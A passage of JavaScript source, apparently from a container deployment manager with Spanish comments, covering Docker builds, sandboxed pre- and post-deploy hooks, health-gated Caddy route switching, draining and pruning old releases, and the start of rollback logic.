          branch: sync.branch,
          commit: sync.commit,
          shortCommit: sync.shortCommit,
          subject: sync.subject,
          author: sync.author,
          committedAt: sync.committedAt || null,
          action: sync.action,
          previousCommit: sync.previousCommit,
          discardedChanges: (sync.dirtyFiles || []).length
        };

        if (sync.action === 'omitido') {
          this.log(deployment, 'WARN', sync.reason);
        } else {
          const verb = sync.action === 'clonado'
            ? 'Repositorio clonado'
            : sync.action === 'sin-cambios'
              ? 'El repositorio ya estaba al día'
              : 'Repositorio actualizado';
          this.log(
            deployment,
            'INFO',
            `${verb}: ${sync.shortCommit} en «${sync.branch}»${sync.subject ? ` — ${sync.subject}` : ''}${sync.author ? ` (${sync.author})` : ''}`
          );
        }
      }

      if (!fs.existsSync(contextDir)) {
        const msg = `No hay código en ${contextDir}. Clona el repositorio del proyecto antes de desplegar.`;
        this.log(deployment, 'ERROR', msg);
        return finish('fallido', msg);
      }

      if (rejectedEnv.length > 0) {
        this.log(deployment, 'WARN', `Variables de entorno ignoradas por nombre inválido: ${rejectedEnv.join(', ')}`);
      }

      // --- 1. Estrategia --------------------------------------------------
      const strategy = await this.detectStrategy(contextDir, project);
      deployment.strategy = {
        builder: strategy.builder,
        stack: strategy.stack,
        containerPort: strategy.containerPort,
        healthPath: strategy.healthPath,
        reason: strategy.reason
      };
      deployment.containerPort = strategy.containerPort;
      this.log(deployment, 'INFO', `Estrategia de construcción: ${strategy.reason}`);

      if (strategy.builder === 'generated' && strategy.stack === 'desconocido') {
        const msg = 'No se ha podido determinar cómo construir este proyecto. Añade un Dockerfile al repositorio o instala railpack.';
        this.log(deployment, 'ERROR', msg);
        return finish('fallido', msg);
      }

      // --- 2. Construcción (protegida por semáforo global de concurrencia) ---
      if (this._activeBuilds >= this.maxConcurrentBuilds) {
        setStage('en_cola');
        this.log(
          deployment,
          'INFO',
          `Esperando turno en la cola de builds (${this._activeBuilds}/${this.maxConcurrentBuilds} en curso para proteger la RAM del host)`
        );
      }
      let slot;
      try {
        slot = await this.acquireBuildSlot(project.id, deployment.id, { signal: opController.signal });
      } catch (slotErr) {
        if (slotErr && slotErr.code === 'DEPLOY_CANCELLED') {
          this.log(deployment, 'WARN', slotErr.message);
          return finish('cancelado', slotErr.message);
        }
        throw slotErr;
      }
      if (slot.waited) {
        this.log(deployment, 'INFO', `Turno de construcción adquirido tras cola (posición ${slot.position})`);
      }
      let buildOk;
      try {
        if (opController.signal.aborted || this._abortedProjects.has(project.id)) {
          this.log(deployment, 'WARN', 'Despliegue cancelado antes de iniciar la construcción');
          return finish('cancelado', 'Despliegue cancelado');
        }
        setStage('construyendo');
        buildOk = await this.runBuild(deployment, { strategy, contextDir, project, opts, envVars, signal: opController.signal });
      } finally {
        this.releaseBuildSlot();
      }
      if (opController.signal.aborted || this._abortedProjects.has(project.id)) {
        this.log(deployment, 'WARN', 'Despliegue cancelado durante la construcción');
        return finish('cancelado', 'Despliegue cancelado');
      }
      if (!buildOk.ok) return finish('fallido', buildOk.error);

      // Precedencia correcta de memoria: options.memoryMb explícito > project.memoryMb > DEFAULTS.memoryMb
      const rawMem = options.memoryMb != null ? Number(options.memoryMb) : Number(project.memoryMb);
      const safeMemMb = Number.isInteger(rawMem) && rawMem >= 32 && rawMem <= 65536 ? rawMem : opts.memoryMb;
      const safeCpus = /^[0-9]+(\.[0-9]+)?$/.test(String(project.cpus || '')) ? String(project.cpus) : opts.cpus;

      // Preparar paso de variables de entorno: preferir `-e KEY` en memoria (conserva PEM multilínea
      // y no escribe secretos en disco), usando `--env-file` solo para claves en HOST_HIJACK_ENV_BLOCKLIST.
      const inlineEnvNames = envNames.filter((k) => !HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase()));
      const fileOnlyEnvNames = envNames.filter((k) => HOST_HIJACK_ENV_BLOCKLIST.has(k.toUpperCase()));
      const childRunEnv = { ...process.env, ...filterSafeHostEnv(envVars) };

      // --- 2.5. Hook pre-deploy (ej. migraciones Prisma/Drizzle antes de arrancar tráfico) ---
      if (preHookArgv && preHookArgv.length > 0) {
        setStage('pre_deploy');
        await this.ensureNetwork(opts.network);
        const preName = `${deployment.containerName}_pre`;
        const hookTimeoutMs = Math.min(600000, Math.max(5000, Number(project.hookTimeoutMs) || 120000));
        this.log(deployment, 'INFO', `Ejecutando hook pre-despliegue: ${preHookArgv.join(' ')}`);

        /** @type {string | null} */
        let preEnvFile = null;
        try {
          const createArgs = [
            'create',
            '--name', preName,
            '--network', opts.network,
            '--memory', `${safeMemMb}m`,
            '--memory-swap', `${safeMemMb}m`,
            '--cpus', String(safeCpus),
            '--pids-limit', String(opts.pidsLimit),
            '--security-opt', 'no-new-privileges',
            '--cap-drop', 'ALL',
            '--label', 'culkibo.managed=true',
            '--label', `com.culkibo.project_id=${project.id}`,
            '--label', `com.culkibo.hook=pre_deploy`
          ];
          if (fileOnlyEnvNames.length > 0) {
            fs.mkdirSync(TMP_ENV_DIR, { recursive: true, mode: 0o700 });
            preEnvFile = path.join(TMP_ENV_DIR, `preenv_${crypto.randomBytes(8).toString('hex')}`);
            const lines = fileOnlyEnvNames.map(k => `${k}=${String(envVars[k] == null ? '' : envVars[k]).replace(/[\r\n]+/g, ' ')}`);
            fs.writeFileSync(preEnvFile, lines.join('\n') + '\n', { encoding: 'utf8', mode: 0o600 });
            createArgs.push('--env-file', preEnvFile);
          }
          for (const k of inlineEnvNames) createArgs.push('-e', k);
          createArgs.push(deployment.imageTag, ...preHookArgv);

          const created = await this.runDocker(createArgs, { timeoutMs: 30000, env: childRunEnv, signal: opController.signal, projectId: project.id });
          if (created.code !== 0) {
            const msg = this.redact(created.stderr.trim() || `No se pudo crear contenedor pre-deploy (código ${created.code})`, allSecretValues);
            this.log(deployment, 'ERROR', msg);
            return finish('fallido', msg);
          }

          for (const dbNet of linkedDb.networks) {
            if (dbNet === opts.network) continue;
            await this.runDocker(['network', 'connect', dbNet, preName], { timeoutMs: 10000 }).catch(() => {});
          }

          const preRes = await this.runDocker(['start', '-a', preName], {
            timeoutMs: hookTimeoutMs,
            signal: opController.signal,
            projectId: project.id,
            onLine: (line) => this.log(deployment, 'INFO', `[pre-deploy] ${this.redact(line, allSecretValues)}`)
          });
          if (preRes.aborted || opController.signal.aborted) {
            return finish('cancelado', 'Despliegue cancelado durante hook pre-despliegue');
          }
          if (preRes.code !== 0) {
            const msg = this.redact(preRes.stderr.trim() || `Hook pre-despliegue falló con código ${preRes.code}`, allSecretValues);
            this.log(deployment, 'ERROR', `Hook pre-despliegue abortado: ${msg.slice(0, 600)}`);
            return finish('fallido', `Hook pre-despliegue falló: ${msg.slice(0, 400)}`);
          }
          this.log(deployment, 'SUCCESS', 'Hook pre-despliegue completado correctamente');
        } finally {
          if (preEnvFile) { try { fs.unlinkSync(preEnvFile); } catch (e) {} }
          await this.runDocker(['rm', '-f', preName], { timeoutMs: 15000 }).catch(() => {});
        }
      }

      // --- 3. Arranque del contenedor nuevo --------------------------------
      setStage('arrancando');
      await this.ensureNetwork(opts.network);

      const hostPort = await this.findFreePort(20000, deployment.id);
      deployment.hostPort = hostPort;
      this.inFlightContainers.add(deployment.containerName);

      /** @type {string | null} */
      let envFile = null;
      let run;
      try {
        if (fileOnlyEnvNames.length > 0) {
          fs.mkdirSync(TMP_ENV_DIR, { recursive: true, mode: 0o700 });
          envFile = path.join(TMP_ENV_DIR, `depenv_${crypto.randomBytes(8).toString('hex')}`);
          const lines = fileOnlyEnvNames.map(k => `${k}=${String(envVars[k] == null ? '' : envVars[k]).replace(/[\r\n]+/g, ' ')}`);
          fs.writeFileSync(envFile, lines.join('\n') + '\n', { encoding: 'utf8', mode: 0o600 });
        }

        const runArgs = this.runArgs({
          containerName: deployment.containerName,
          imageTag: deployment.imageTag,
          hostPort,
          containerPort: strategy.containerPort,
          envNames: inlineEnvNames,
          envFile,
          network: opts.network,
          memoryMb: safeMemMb,
          cpus: safeCpus,
          pidsLimit: opts.pidsLimit,
          healthCmd: strategy.injectHealthcheck ? this.healthCommandFor(strategy) : null,
          labels: {
            'culkibo.managed': 'true',
            'com.culkibo.project': safeSlug(project.id),
            'com.culkibo.project_id': project.id,
            'com.culkibo.deployment': deployment.id,
            'com.culkibo.version': version
          }
        });

        run = await this.runDocker(runArgs, { timeoutMs: 60000, env: childRunEnv, signal: opController.signal, projectId: project.id });
      } finally {
        this._pendingPorts.delete(hostPort);
        if (envFile) {
          try { fs.unlinkSync(envFile); } catch (e) {}
        }
      }
      const protectedContainers = new Set(
        [state.current && state.current.containerName, state.previous && state.previous.containerName].filter(Boolean)
      );
      if (run.aborted || opController.signal.aborted) {
        await this.forceRemove(deployment.containerName, protectedContainers);
        return finish('cancelado', 'Despliegue cancelado durante el arranque');
      }
      if (run.code !== 0) {
        const msg = this.redact(run.stderr.trim() || `docker run terminó con código ${run.code}`, allSecretValues);
        this.log(deployment, 'ERROR', `No se pudo arrancar el contenedor: ${msg}`);
        await this.forceRemove(deployment.containerName, protectedContainers);
        this._pruneFailedImage(deployment.imageTag, state);
        return finish('fallido', msg);
      }

      // Conectar redes aisladas de bases de datos vinculadas al proyecto
      if (linkedDb.networks.length > 0) {
        for (const dbNet of linkedDb.networks) {
          if (dbNet === opts.network) continue;
          const conn = await this.runDocker(['network', 'connect', dbNet, deployment.containerName], { timeoutMs: 10000 });
          if (conn.code !== 0 && !/already exists/i.test(conn.stderr || '')) {
            this.log(deployment, 'WARN', `No se pudo conectar la red de BD ${dbNet}: ${(conn.stderr || '').trim().slice(0, 200)}`);
          }
        }
        this.log(deployment, 'INFO', `Conectado a ${linkedDb.linkedNames.length} base(s) de datos vinculada(s): ${linkedDb.linkedNames.join(', ')}`);
      }
      this.log(deployment, 'INFO', `Contenedor ${deployment.containerName} arrancado en 127.0.0.1:${hostPort}`);

      // --- 4. Puerta de salud ---------------------------------------------
      setStage('verificando');
      const health = await this.waitForHealth({
        hostPort,
        containerPort: strategy.containerPort,
        healthPath: strategy.healthPath,
        containerName: deployment.containerName,
        timeoutMs: opts.healthTimeoutMs,
        intervalMs: opts.healthIntervalMs,
        signal: opController.signal,
        onProgress: (m) => this.log(deployment, 'INFO', m)
      });

      if (health.aborted || opController.signal.aborted) {
        await this.forceRemove(deployment.containerName, protectedContainers);
        return finish('cancelado', 'Despliegue cancelado durante verificación de salud');
      }
      if (!health.healthy) {
        this.log(deployment, 'ERROR', `La versión nueva no pasó la verificación de salud: ${health.reason}`);
        await this.captureContainerLogs(deployment, deployment.containerName);
        await this.forceRemove(deployment.containerName, protectedContainers);
        this._pruneFailedImage(deployment.imageTag, state);
        deployment.__failNotified = true;
        this.notify({
          event: 'deploy_failed',
          level: 'error',
          title: 'Despliegue abortado',
          message: `${deployment.projectName}: la versión nueva no pasó la verificación de salud (${health.reason}). La versión anterior sigue sirviendo tráfico.`,
          projectId: project.id,
          projectName: deployment.projectName
        });
        return finish('fallido', health.reason);
      }
      this.log(deployment, 'SUCCESS', `Verificación de salud superada (HTTP ${health.status} tras ${health.attempts} intentos)`);

      if (this._abortedProjects.has(project.id) || opController.signal.aborted) {
        this.log(deployment, 'WARN', 'Despliegue cancelado antes de promocionar');
        await this.forceRemove(deployment.containerName, protectedContainers);
        return finish('cancelado', 'Despliegue cancelado');
      }

      // --- 5. Conmutación de la ruta ---------------------------------------
      setStage('promocionando');
      const upstream = await this.resolveUpstream({
        containerName: deployment.containerName,
        containerPort: strategy.containerPort,
        hostPort,
        network: opts.network
      });
      deployment.upstream = upstream.dial;
      if (upstream.warning) this.log(deployment, 'WARN', `No se pudo adjuntar Caddy a la red ${opts.network}: ${upstream.warning}`);

      if (deployment.hostnames.length === 0) {
        this.log(deployment, 'WARN', 'El proyecto no tiene dominios asignados: el servicio queda accesible solo en el host. Añade un dominio para publicarlo.');
      } else {
        const switched = await this.switchRoute(deployment, deployment.hostnames, upstream.dial, project);
        if (!switched.ok) {
          this.log(deployment, 'ERROR', `No se pudo conmutar la ruta: ${switched.error}. Se conserva la versión anterior.`);
          await this.forceRemove(deployment.containerName, protectedContainers);
          return finish('fallido', switched.error);
        }
      }

      // Re-comprobar aborto tras conmutar (cierra ventana race con forget() durante switchRoute)
      if (this._abortedProjects.has(project.id)) {
        try { await caddyManager.removeRoute(project.id); } catch (e) {}
        await this.forceRemove(deployment.containerName, protectedContainers);
        return finish('cancelado', 'Proyecto eliminado durante la promoción');
      }

      // --- 6. Promoción del registro ---------------------------------------
      /** @type {any} */
      const release = {
        deploymentId: deployment.id,
        projectName: deployment.projectName,
        imageTag: deployment.imageTag,
        containerName: deployment.containerName,
        hostPort,
        containerPort: strategy.containerPort,
        upstream: deployment.upstream,
        healthPath: strategy.healthPath,
        hostnames: deployment.hostnames,
        version,
        git: deployment.git,
        promotedAt: new Date().toISOString()
      };
      const retiring = state.current;
      state.previous = retiring || null;
      state.current = release;
      this.saveStore();

      // Actualizar lastDeployedAt y lastCommit en Project únicamente cuando llega a activo
      try {
        const pm = getProjectManager();
        if (pm && typeof pm.getById === 'function' && pm.getById(project.id)) {
          pm.update(project.id, {
            lastDeployedAt: release.promotedAt,
            ...(deployment.git?.shortCommit ? { lastCommit: deployment.git.shortCommit } : {})
          });
        }
      } catch (e) {}

      // --- 6.5. Hook post-deploy (en contenedor recién promocionado) ---------
      if (postHookArgv && postHookArgv.length > 0) {
        setStage('post_deploy');
        const hookTimeoutMs = Math.min(600000, Math.max(5000, Number(project.hookTimeoutMs) || 120000));
        this.log(deployment, 'INFO', `Ejecutando hook post-despliegue: ${postHookArgv.join(' ')}`);
        const postRes = await this.runDocker(['exec', deployment.containerName, ...postHookArgv], {
          timeoutMs: hookTimeoutMs,
          onLine: (line) => this.log(deployment, 'INFO', `[post-deploy] ${this.redact(line, allSecretValues)}`)
        });
        if (postRes.code !== 0) {
          const postErr = this.redact(postRes.stderr.trim() || `Hook post-despliegue terminó con código ${postRes.code}`, allSecretValues);
          this.log(deployment, 'WARN', `Hook post-despliegue falló: ${postErr.slice(0, 400)}`);
          if (project.postDeployFailPolicy === 'rollback' && state.previous) {
            this.log(deployment, 'ERROR', 'Política postDeployFailPolicy=rollback: revirtiendo a la versión anterior...');
            // Dejar que el rollback se lance tras soltar el lock del despliegue actual
            setImmediate(() => {
              this.rollback(project.id, { trigger: 'post-deploy-rollback' }).catch(() => {});
            });
          }
        } else {
          this.log(deployment, 'SUCCESS', 'Hook post-despliegue completado correctamente');
        }
      }

      // --- 7. Drenaje del viejo, en segundo plano ---------------------------
      if (retiring && retiring.containerName !== deployment.containerName) {
        const drain = this.drainAndRetire(deployment, retiring, opts)
          .catch(err => this.log(deployment, 'WARN', `Fallo al retirar la versión anterior: ${err.message}`))
          .finally(() => { if (this.drains.get(project.id) === drain) this.drains.delete(project.id); });
        this.drains.set(project.id, drain);
      }

      this.log(deployment, 'SUCCESS', `Despliegue completado en ${((Date.now() - started) / 1000).toFixed(1)} s — sirviendo ${deployment.imageTag}`);
      this.notify({
        event: 'deploy_succeeded',
        level: 'success',
        title: 'Despliegue completado',
        message: `${deployment.projectName} está sirviendo ${deployment.imageTag}${deployment.hostnames.length ? ` en ${deployment.hostnames.join(', ')}` : ''}.`,
        projectId: project.id,
        projectName: deployment.projectName
      });
      return finish('activo');
    } catch (err) {
      this.log(deployment, 'ERROR', `Error inesperado en el despliegue: ${err.message}`);
      const protectedSet = new Set(
        [state.current && state.current.containerName, state.previous && state.previous.containerName].filter(Boolean)
      );
      try { await this.forceRemove(deployment.containerName, protectedSet); } catch (e) {}
      return finish('fallido', err.message);
    } finally {
      this._activeOps.delete(project.id);
      this._abortedProjects.delete(project.id);
      this.inFlightContainers.delete(deployment.containerName);
      if (deployment.hostPort) portRegistry.release(deployment.hostPort, deployment.id);
    }
  }

  /** Elimina una imagen recién construida de un despliegue fallido (si no la usa current/previous). */
  _pruneFailedImage(imageTag, state) {
    if (!imageTag) return;
    if (state?.current?.imageTag === imageTag || state?.previous?.imageTag === imageTag) return;
    this.runDocker(['rmi', imageTag], { timeoutMs: 15000 }).catch(() => {});
  }

  /**
   * Ejecuta el constructor elegido y transmite su salida como eventos de log.
   * @param {any} deployment
   * @param {{ strategy: any, contextDir: string, project: any, opts: any, envVars: Record<string, any>, signal?: AbortSignal | null }} spec
   */
  async runBuild(deployment, { strategy, contextDir, project, opts, envVars, signal = null }) {
    const buildArgsMap = project.buildArgs || {};
    const secrets = [...Object.values(envVars), ...Object.values(buildArgsMap)];
    const onLine = (line) => this.log(deployment, 'INFO', line);

    if (strategy.builder === 'railpack' || strategy.builder === 'nixpacks') {
      const buildArgNames = Object.keys(buildArgsMap).filter(isValidEnvName);
      const args = this.externalBuilderArgs(strategy.builder, {
        imageTag: deployment.imageTag,
        contextDir,
        envNames: strategy.builder === 'nixpacks' ? buildArgNames : []
      });
      this.log(deployment, 'INFO', `Construyendo con ${strategy.builder}: ${deployment.imageTag}`);
      const res = await this.runTool(strategy.builder, args, {
        timeoutMs: opts.buildTimeoutMs,
        cwd: contextDir,
        env: { ...process.env, DOCKER_BUILDKIT: '1', ...filterSafeHostEnv(buildArgsMap) },
        onLine,
        signal,
        projectId: deployment.projectId
      });
      if (res.aborted) return { ok: false, error: 'Construcción cancelada', aborted: true };
      if (res.code !== 0) {
        const msg = this.redact(res.stderr.trim() || `${strategy.builder} terminó con código ${res.code}`, secrets);
        this.log(deployment, 'ERROR', `Fallo de construcción: ${msg.slice(0, 2000)}`);
        return { ok: false, error: msg.slice(0, 600) };
      }
      return { ok: true };
    }

    const buildArgNames = Object.keys(buildArgsMap).filter(isValidEnvName);
    let dockerfile = strategy.dockerfile;
    if (strategy.builder === 'generated') {
      const text = this.generateDockerfile({ ...strategy, projectSlug: safeSlug(project.id), buildArgNames });
      if (!text) return { ok: false, error: 'No se ha podido generar un Dockerfile para este stack' };
      const genDir = path.join(contextDir, '.culkibo');
      fs.mkdirSync(genDir, { recursive: true });
      fs.writeFileSync(path.join(genDir, 'Dockerfile'), text, 'utf8');
      const genIgnore = path.join(genDir, 'Dockerfile.dockerignore');
      if (!fs.existsSync(path.join(contextDir, '.dockerignore'))) {
        fs.writeFileSync(genIgnore, this.defaultDockerignore(), 'utf8');
      } else if (fs.existsSync(genIgnore)) {
        try { fs.unlinkSync(genIgnore); } catch (e) {}
      }
      dockerfile = path.join('.culkibo', 'Dockerfile');
      this.log(deployment, 'INFO', `Dockerfile generado en .culkibo/Dockerfile (stack: ${strategy.stack}, BuildKit cache mounts aislados)`);
    }

    const args = this.buildArgs({
      imageTag: deployment.imageTag,
      contextDir,
      dockerfile,
      buildArgNames,
      labels: {
        'com.culkibo.project': safeSlug(project.id),
        'com.culkibo.project_id': project.id,
        'com.culkibo.deployment': deployment.id
      }
    });

    this.log(deployment, 'INFO', `Construyendo imagen ${deployment.imageTag}...`);
    const res = await this.runDocker(args, {
      timeoutMs: opts.buildTimeoutMs,
      cwd: contextDir,
      env: { ...process.env, DOCKER_BUILDKIT: '1', ...filterSafeHostEnv(project.buildArgs || {}) },
      onLine,
      signal,
      projectId: deployment.projectId
    });

    if (res.aborted) return { ok: false, error: 'Construcción cancelada', aborted: true };
    if (res.code !== 0) {
      const msg = this.redact(res.stderr.trim() || `docker build terminó con código ${res.code}`, secrets);
      this.log(deployment, 'ERROR', `Fallo de construcción: ${msg.slice(0, 2000)}`);
      deployment.__failNotified = true;
      this.notify({
        event: 'deploy_failed',
        level: 'error',
        title: 'Fallo de construcción',
        message: `${deployment.projectName}: la imagen no se pudo construir.\n\n${msg.slice(0, 600)}`,
        projectId: deployment.projectId,
        projectName: deployment.projectName
      });
      return { ok: false, error: msg.slice(0, 600) };
    }

    this.log(deployment, 'SUCCESS', `Imagen ${deployment.imageTag} construida`);
    return { ok: true };
  }

  /**
   * Mueve la ruta del proyecto al destino nuevo preservando modo mantenimiento,
   * cabeceras de seguridad, Basic Auth y orden de especificidad en Caddy.
   */
  async switchRoute(deployment, hostnames, dial, projectHint = null) {
    try {
      const pm = getProjectManager();
      const liveProject = projectHint || (pm && typeof pm.getById === 'function' ? pm.getById(deployment.projectId) : null);

      // Si el proyecto está en modo mantenimiento atómico, no pisar la página 503;
      // el nuevo upstream queda guardado en state.current para cuando se desactive.
      if (liveProject && liveProject.maintenanceMode) {
        deployment.routeSwitched = false;
        this.log(deployment, 'INFO', `Modo mantenimiento activo: release lista en ${dial} (la página 503 se mantiene hasta desactivar mantenimiento)`);
        return { ok: true, maintenancePreserved: true };
      }

      const detection = await caddyManager.detect();
      if (!detection.available) {
        return { ok: false, error: `Caddy no está disponible: ${detection.reason}` };
      }

      // Intentar enriquecer la ruta con las políticas del dominio (cabeceras, Basic Auth, IP allowlist)
      const ing = getIngressManager();
      if (ing && typeof ing.ensureServer === 'function') {
        try { await ing.ensureServer(); } catch (e) {}
      }
      /** @type {any} */
      let domainPolicy = null;
      try {
        const domainManager = require('./domainManager');
        const doms = domainManager.listByProject ? domainManager.listByProject(deployment.projectId) : [];
        const activeDoms = doms.filter((d) => d.status !== 'disabled');
        if (activeDoms.length > 0) {
          domainPolicy = {
            securityHeaders: activeDoms.some((d) => d.securityHeaders !== false),
            customHeaders: activeDoms.find((d) => d.customHeaders && (d.customHeaders.response || d.customHeaders.request))?.customHeaders || null,
            basicAuth: activeDoms.find((d) => d.basicAuth && d.basicAuth.enabled)?.basicAuth || null,
            ipAllowlist: activeDoms.find((d) => Array.isArray(d.ipAllowlist) && d.ipAllowlist.length > 0)?.ipAllowlist || null
          };
        }
      } catch (e) {}

      await caddyManager.upsertRoute({
        projectId: deployment.projectId,
        hostnames,
        upstreams: [dial],
        ...(domainPolicy || {})
      });
      deployment.routeSwitched = true;
      this.log(deployment, 'SUCCESS', `Ruta conmutada: ${hostnames.join(', ')} -> ${dial}`);
      return { ok: true };
    } catch (err) {
      return { ok: false, error: err.message };
    }
  }

  /**
   * Retira la versión anterior después de la ventana de drenaje.
   *
   * Orden, y el orden es todo el asunto:
   *   1. la ruta YA apunta al contenedor nuevo (hecho antes de llamar aquí);
   *   2. se espera `drainTimeoutMs` con el viejo todavía sirviendo lo que tenía
   *      en vuelo;
   *   3. `docker stop --time=<gracia>`: SIGTERM, margen para cerrar, SIGKILL;
   *   4. NO se borra. El contenedor parado y su imagen son el ancla del
   *      rollback: volver atrás es arrancarlo y mover la ruta, no reconstruir.
   *
   * Diferencia conocida con kamal-proxy: él sabe qué peticiones tiene en vuelo
   * (lleva un `inflightMap` por destino) y termina en cuanto la última acaba,
   * cancelando de entrada las conexiones promocionadas —WebSockets— porque
   * pueden durar horas. Culkibo no tiene esa contabilidad: el proxy es Caddy y
   * no nos la expone. Así que esperamos la ventana completa, que es más lento
   * pero nunca corta antes de tiempo. El `stream_close_delay` de 5 s que
   * `caddyManager.buildRoute()` pone en el handler cubre el caso del streaming
   * durante la recarga de configuración.
   */
  async drainAndRetire(deployment, retiring, opts) {
    // Drenaje independiente por containerName (no por projectId) para que despliegues rápidos A->B->C
    // jamás dejen B colgado sin detenerse ni cancelen el drenaje de otro contenedor distinto.
    const projectId = deployment.projectId;
    const retiringName = retiring.containerName;
    this.cancelContainerDrain(retiringName);
    this.log(deployment, 'INFO', `Drenando ${retiringName} durante ${Math.round(opts.drainTimeoutMs / 1000)} s antes de detenerlo`);

    const cancelled = await new Promise((resolve) => {
      const timer = setTimeout(() => {
        if (this._drainTimers.get(retiringName)?.timer === timer) {
          this._drainTimers.delete(retiringName);
        }
        resolve(false);
      }, opts.drainTimeoutMs);
      if (timer.unref) timer.unref();
      this._drainTimers.set(retiringName, { projectId, timer, resolve });
    });

    if (cancelled) return;

    const latestState = this.store[projectId];
    if (!latestState || (latestState.current && latestState.current.containerName === retiringName)) {
      this.log(deployment, 'INFO', `Drenaje omitido para ${retiringName}: sigue siendo la versión activa`);
      return;
    }

    const stop = await this.runDocker(
      ['stop', '--time', String(opts.stopGraceSeconds), retiringName],
      { timeoutMs: (opts.stopGraceSeconds + 20) * 1000 }
    );
    if (stop.code === 0) {
      this.log(deployment, 'INFO', `Versión anterior detenida: ${retiringName} (se conserva para el rollback)`);
    } else {
      this.log(deployment, 'WARN', `No se pudo detener ${retiringName}: ${stop.stderr.trim()}`);
    }

    await this.pruneOldReleases(projectId, opts.keepReleases);
    this.saveStore();
  }

  async pruneOldReleases(projectId, keep = DEFAULTS.keepReleases) {
    const state = this.getState(projectId);
    const slug = safeSlug(projectId);
    // Proteger current, previous, cualquier contenedor en vuelo (arrancando/verificando) y cualquier drenaje activo
    const alive = new Set([
      ...[state.current, state.previous].filter(Boolean).map(r => r.containerName),
      ...this.inFlightContainers,
      ...this._drainTimers.keys()
    ]);
    const aliveImages = new Set([state.current, state.previous].filter(Boolean).map(r => r.imageTag));

    // Buscar primero por label exacto `com.culkibo.project_id` (evita colisión de slugs de 48 chars),
    // con fallback al label legacy `com.culkibo.project` solo para contenedores antiguos sin project_id.
    const listById = await this.runDocker(
      ['ps', '-a', '--filter', `label=com.culkibo.project_id=${projectId}`, '--format', '{{.Names}}'],
      { timeoutMs: 10000 }
    );
    const listBySlug = await this.runDocker(
      ['ps', '-a', '--filter', `label=com.culkibo.project=${slug}`, '--format', '{{.Names}}|{{.Label "com.culkibo.project_id"}}'],
      { timeoutMs: 10000 }
    );
    /** @type {Set<string>} */
    const candidateContainers = new Set();
    if (listById.code === 0) {
      for (const name of (listById.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        candidateContainers.add(name);
      }
    }
    if (listBySlug.code === 0) {
      for (const line of (listBySlug.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        const [name, labelProjId] = line.split('|');
        if (name && (!labelProjId || labelProjId === projectId)) {
          candidateContainers.add(name);
        }
      }
    }

    /** @type {string[]} */
    const removed = [];
    for (const name of candidateContainers) {
      if (alive.has(name)) continue;
      const res = await this.runDocker(['rm', '-f', name], { timeoutMs: 20000 });
      if (res.code === 0) removed.push(name);
    }

    // Podar imágenes Docker antiguas del proyecto conservando las más recientes (`keep`) y las vivas
    /** @type {string[]} */
    const removedImages = [];
    const keepTags = new Set(aliveImages);
    const historyImgs = (state.history || []).map((h) => h.imageTag).filter(Boolean);
    for (const tag of historyImgs.slice(0, Math.max(2, Number(keep) || 2))) keepTags.add(tag);

    const [imgByLabel, imgByRef] = await Promise.all([
      this.runDocker(['images', '--filter', `label=com.culkibo.project_id=${projectId}`, '--format', '{{.Repository}}:{{.Tag}}'], { timeoutMs: 10000 }),
      this.runDocker(['images', '--filter', `reference=culkibo/${slug}:*`, '--format', '{{.Repository}}:{{.Tag}}'], { timeoutMs: 10000 })
    ]);
    /** @type {Set<string>} */
    const candidateTags = new Set();
    for (const res of [imgByLabel, imgByRef]) {
      if (res.code !== 0) continue;
      for (const tag of (res.stdout || '').split(/\r?\n/).map(s => s.trim()).filter(Boolean)) {
        candidateTags.add(tag);
      }
    }
    for (const tag of candidateTags) {
      if (!tag || tag.includes('<none>') || keepTags.has(tag)) continue;
      const rmi = await this.runDocker(['rmi', tag], { timeoutMs: 20000 });
      if (rmi.code === 0) removedImages.push(tag);
    }
    // Podar capas huérfanas `<none>` etiquetadas para este proyecto
    await this.runDocker(['image', 'prune', '-f', '--filter', `label=com.culkibo.project_id=${projectId}`], { timeoutMs: 15000 }).catch(() => {});

    return { removed, removedImages, keep };
  }

  /** @param {string} containerName @param {Set<string> | null} [protectedNames] */
  async forceRemove(containerName, protectedNames = null) {
    if (!containerName) return;
    if (protectedNames && protectedNames.has(containerName)) return;
    await this.runDocker(['rm', '-f', containerName], { timeoutMs: 20000 });
  }

  /** Vuelca las últimas líneas del contenedor al log del despliegue. */
  async captureContainerLogs(deployment, containerName, lines = 60) {
    const res = await this.runDocker(['logs', '--tail', String(lines), containerName], { timeoutMs: 10000 });
    const text = `${res.stdout || ''}${res.stderr || ''}`.trim();
    if (!text) return;
    this.log(deployment, 'ERROR', `Últimas líneas del contenedor:\n${text.slice(0, 3000)}`);
  }

  // -------------------------------------------------------------------------
  // 6. Rollback
  // -------------------------------------------------------------------------

  /**
   * Vuelve a la versión anterior.
   *
   * Dos caminos, y el rápido es el habitual:
   *
   *   - Si el contenedor anterior sigue en ejecución (todavía estamos dentro de
   *     su ventana de drenaje), el rollback es SOLO un cambio de ruta:
   *     milisegundos, sin arrancar nada.
   *   - Si ya está parado, se arranca, se espera a que esté sano y entonces se
   *     conmuta. Nunca al revés: mover la ruta a algo que aún no responde es
   *     cambiar una versión mala por un 502.
   *
   * En ningún caso se reconstruye la imagen: el rollback no puede depender de
   * que un build vuelva a salir bien.
   */
  async rollback(projectOrId, options = {}) {
    const projectId = (projectOrId && typeof projectOrId === 'object') ? projectOrId.id : projectOrId;
    if (!projectId || typeof projectId !== 'string') throw new Error('Proyecto inválido');
    if (this.locks.has(projectId)) {
      throw new Error('Ya hay una operación de despliegue o rollback en curso para este proyecto');
    }
    const task = this._rollback(projectId, options).finally(() => {
      if (this.locks.get(projectId) === task) this.locks.delete(projectId);
      // Nunca re-desplegar un push encolado justo después de un rollback explícito
      this.pending.delete(projectId);
    });
    this.locks.set(projectId, task);
    return task;
  }

  async _rollback(projectId, options = {}) {
    const opts = { ...DEFAULTS, ...options };
    const state = this.getState(projectId);
    const current = state.current;

    // Selección multi-release: permite revertir a cualquier release histórica por `deploymentId`
    let target = state.previous;
    if (options.deploymentId) {
      if (state.previous && state.previous.deploymentId === options.deploymentId) {
        target = state.previous;
      } else {
        const hist = (state.history || []).find(
          (h) => h.id === options.deploymentId && h.kind !== 'rollback' && (h.imageTag || h.containerName)
        );
        if (!hist) {
          throw new Error(`No se encontró el despliegue ${options.deploymentId} en el historial`);
        }
        target = {
          deploymentId: hist.id,
          projectName: hist.projectName || projectId,
          imageTag: hist.imageTag,
          containerName: hist.containerName,
